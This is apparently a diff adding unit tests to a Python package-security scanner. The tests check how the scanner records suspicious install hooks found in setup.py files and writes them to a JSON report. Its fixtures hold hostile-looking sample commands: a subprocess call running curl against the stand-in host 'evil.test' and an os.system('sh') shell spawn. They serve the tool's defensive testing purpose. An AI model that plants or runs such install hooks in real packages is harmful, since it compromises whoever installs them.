@@ -11,6 +11,8 @@ from nidhogg.core.models import (
     BinaryFormat,
     FileAnalysis,
     FileTag,
+    InstallHookFinding,
+    InstallHookSource,
     PackageAnalysis,
     UrlFinding,
     UrlTag,
@@ -19,7 +21,9 @@ from nidhogg.output.writer import (
     _serialise_finding,
     build_binaries_document,
     build_document,
+    build_install_hooks_document,
     write_binary_results,
+    write_install_hook_results,
     write_results,
 )
 
@@ -350,3 +354,77 @@ def test_write_binary_results_creates_sibling_file(tmp_path: Path) -> None:
     assert sibling.exists()
     data = json.loads(sibling.read_text())
     assert data["binaries"][0]["name"] == "helper.dll"
+
+
+# ---------------------------------------------------------------------------
+# Install hooks document tests
+# ---------------------------------------------------------------------------
+
+
+def _install_hook(
+    tmp_path: Path,
+    call: str = "subprocess.Popen",
+    command: str = "subprocess.Popen(['curl', 'http://evil.test'])",
+    context: str = "module",
+    source: InstallHookSource = InstallHookSource.SETUP_PY,
+) -> InstallHookFinding:
+    return InstallHookFinding(
+        filepath=tmp_path / "setup.py",
+        lineno=2,
+        call=call,
+        command=command,
+        context=context,
+        source=source,
+    )
+
+
+def test_build_install_hooks_document_summary_count(tmp_path: Path) -> None:
+    pkg = PackageAnalysis(
+        name="testpkg",
+        path=tmp_path,
+        install_hooks=[
+            _install_hook(tmp_path),
+            _install_hook(tmp_path, call="os.system", command="os.system('sh')"),
+        ],
+    )
+    doc = build_install_hooks_document(pkg)
+    assert doc["summary"] == {"total_findings": 2}
+
+
+def test_build_install_hooks_document_entry_fields(tmp_path: Path) -> None:
+    pkg = PackageAnalysis(
+        name="testpkg", path=tmp_path, install_hooks=[_install_hook(tmp_path)]
+    )
+    doc = build_install_hooks_document(pkg)
+    entry = doc["install_hooks"][0]
+    assert entry["file"] == "setup.py"
+    assert entry["line"] == 2
+    assert entry["call"] == "subprocess.Popen"
+    assert entry["command"] == "subprocess.Popen(['curl', 'http://evil.test'])"
+    assert entry["context"] == "module"
+    assert entry["source"] == "setup_py"
+
+
+def test_build_install_hooks_document_empty_when_no_findings(tmp_path: Path) -> None:
+    pkg = PackageAnalysis(name="testpkg", path=tmp_path)
+    doc = build_install_hooks_document(pkg)
+    assert doc["summary"] == {"total_findings": 0}
+    assert doc["install_hooks"] == []
+
+
+def test_write_install_hook_results_creates_sibling_file(tmp_path: Path) -> None:
+    pkg = PackageAnalysis(
+        name="testpkg", path=tmp_path, install_hooks=[_install_hook(tmp_path)]
+    )
+    out = tmp_path / "results.json"
+
+    write_install_hook_results(pkg, out)
+
+    sibling = tmp_path / "results.install_hooks.json"
+    assert sibling.exists()
+    data = json.loads(sibling.read_text())
+    assert data["install_hooks"][0]["call"] == "subprocess.Popen"
+    assert (
+        data["install_hooks"][0]["command"]
+        == "subprocess.Popen(['curl', 'http://evil.test'])"
+    )
